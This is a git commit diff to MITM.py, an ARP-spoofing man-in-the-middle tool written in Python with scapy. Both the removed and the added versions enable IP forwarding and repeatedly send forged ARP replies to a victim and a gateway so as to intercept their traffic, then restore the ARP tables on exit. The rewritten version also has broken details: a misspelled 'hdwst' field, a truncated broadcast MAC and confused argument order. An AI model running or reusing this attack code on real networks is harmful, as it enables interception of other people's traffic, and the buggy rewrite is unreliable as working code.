0d88259970e3fedfe9540964dbb3c50f2661af8a
lukasbeyen <146734889+lukasbeyen@users.noreply.github.com>
2023-11-09 14:15:10 +0100

    Update MITM.py

--- MITM.py
+++ MITM.py
@@ -1,8 +1,6 @@
-from scapy.all import Ether, ARP, srp, send
-import argparse
-import time
+import scapy.all as scapy
 import os
-import sys
+import time
 
 def _enable_windows_iproute():
     """
@@ -36,70 +34,53 @@ def enable_ip_route(verbose=True):
         print("[!] IP Routing enabled.")
 
 def get_mac(ip):
-    """
-    Returns MAC address of any device connected to the network
-    If ip is down, returns None instead
-    """
-    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
-    if ans:
-        return ans[0][1].src
-    
-def spoof(target_ip, host_ip, verbose=True):
-    """
-    Spoofs `target_ip` saying that we are `host_ip`.
-    it is accomplished by changing the ARP cache of the target (poisoning)
-    """
-    # get the mac address of the target
-    target_mac = get_mac(target_ip)
-    # craft the arp 'is-at' operation packet, in other words; an ARP response
-    # we don't specify 'hwsrc' (source MAC address)
-    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
-    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
-    # send the packet
-    # verbose = 0 means that we send the packet without printing any thing
-    send(arp_response, verbose=0)
-    if verbose:
-        # get the MAC address of the default interface we are using
-        self_mac = ARP().hwsrc
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
-    
-def restore(target_ip, host_ip, verbose=True):
-    """
-    Restores the normal process of a regular network
-    This is done by sending the original informations 
-    (real IP and MAC of `host_ip` ) to `target_ip`
-    """
-    # get the real MAC address of target
-    target_mac = get_mac(target_ip)
-    # get the real MAC address of spoofed (gateway, i.e router)
-    host_mac = get_mac(host_ip)
-    # crafting the restoring packet
-    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
-    # sending the restoring packet
-    # to restore the network to its normal process
-    # we send each reply seven times for a good measure (count=7)
-    send(arp_response, verbose=0, count=7)
-    if verbose:
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
+    #sends arp request to ip adress
+    arp_request = scapy.ARP(pdst = ip)
 
-if __name__ == "__main__":
-    # victim ip address, change this
-    target = "192.168.1.100"
-    # gateway ip address, change this
-    host = "192.168.1.1"
-    # print progress to the screen 
+    #creats ethernet frame that is send to all the devices on the network
+    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff")
+
+    #combines them into a single packet
+    arp_request_broadcast = broadcast / arp_request 
+
+    #makes a list with all the devices who answered to the ip adress
+    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
+    
+    #returns the mac adress stored in answered lists
+    return answered_list[0][1].hwsrc 
+
+def spoof(spoof_ip, target_ip):
+    target_mac = get_mac(target_ip)
+    #creates a packet that contains an ARP reply with: op = 2 makes it an ARP reply 
+    #psrc = ip that you want imporsonate (gateway)
+    #pdst = where the reply is send (target)
+    #hdwst = mac adress of the target you send the reply to
+    false_arp_request = scapy.ARP(pdst = target_ip, hdwst = target_mac, psrc = spoof_ip, op = 2)
+    scapy.send(false_arp_request, verbose = 0)
+
+def restore(spoof_ip, target_ip):
+    spoof_mac = get_mac(spoof_ip)
+    target_mac = get_mac(target_ip)
+    restore_request = scapy.ARP(pdst = target_ip, hdwst = target_mac, psrc = spoof_ip, hwsrc = spoof_mac, op = 2)
+    scapy.send(restore_request, verbose = 0)
+
+def arp_spoof():
     verbose = True
-    # enable ip forwarding
+    #fill in the ip-adress of the victim
+    target = ""
+    #fill in the ip-adress of the host, probably your own!
+    host = ""
+    #enable ip-routing 
     enable_ip_route()
-    try:
-        while True:
-            # telling the `target` that we are the `host`
-            spoof(target, host, verbose)
-            # telling the `host` that we are the `target`
-            spoof(host, target, verbose)
-            # sleep for one second
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("[!] Detected CTRL+C ! restoring the network, please wait...")
-        restore(target, host)
-        restore(host, target)
+    if host != "" and target != "":
+        try: 
+            while True:
+                spoof(target, host)
+                spoof(host, target)
+                time.sleep(2)
+
+        except KeyboardInterrupt:
+            restore(target, host)
+            restore(host, target)
+            print("ARP tables restored!")
+
